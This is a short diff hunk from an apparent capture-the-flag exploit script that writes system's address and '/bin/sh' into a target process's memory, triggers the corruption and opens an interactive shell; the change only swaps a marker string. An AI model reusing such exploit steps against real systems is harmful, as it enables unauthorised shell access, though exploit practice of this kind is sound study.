@@ -70,5 +70,5 @@ plant(5, 8, p64(system_addr))
 plant(6, 8, b'/bin/sh\x00')
 defuse(6) 
 
-p.sendline(b'echo GOTSHELL')
+p.sendline(b'yeeey')
 p.interactive()
